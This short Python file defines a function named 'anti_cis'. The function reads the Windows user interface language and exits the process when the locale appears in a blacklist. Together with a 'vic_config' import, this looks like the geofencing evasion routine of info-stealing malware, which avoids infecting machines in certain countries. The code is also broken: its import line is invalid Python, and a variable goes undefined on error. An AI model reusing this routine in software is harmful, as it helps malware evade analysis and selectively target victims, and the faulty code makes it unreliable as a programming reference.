import ctypes
import vic_config from config



def anti_cis(blacklist:list[str]) -> None:
    try:
        kernel32 = ctypes.windll.kernel32 
        lang_id: int = kernel32.GetUserDefaultUILanguage()
        buf = ctypes.create_unicode_buffer(85)
        kernel32.LCIDToLocaleName(lang_id, buf, 85, 0)
    except Exception as err:
        print(err)
        
    if buf.value.lower() in blacklist:
        ctypes.windll.kernel32.ExitProcess(0)